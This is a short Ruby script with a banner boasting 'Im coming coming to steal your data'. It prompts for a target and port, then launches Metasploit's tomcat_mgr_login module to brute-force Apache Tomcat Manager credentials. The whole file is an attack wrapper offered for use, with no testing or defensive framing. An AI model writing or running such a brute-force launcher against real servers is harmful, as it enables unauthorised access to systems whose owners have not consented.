require 'colorize'
puts """

 	  Th3 M4d_Sc13nT15t is here to stay...
      Im coming coming to steal your data...
  
     TomCat Manager Login Brute Force Scanner
""".white

puts " [?] What is the target? ".blue
print "[!] ---> ".yellow

target = gets.chomp

puts " [?] What is the port? ".blue
print " [!] ---> ".yellow

port = gets.chomp

exec("msfconsole -x 'use scanner/http/tomcat_mgr_login' -x 'setg RHOSTS #{target}'  -x 'setg RPORT #{port}' -x 'run'")

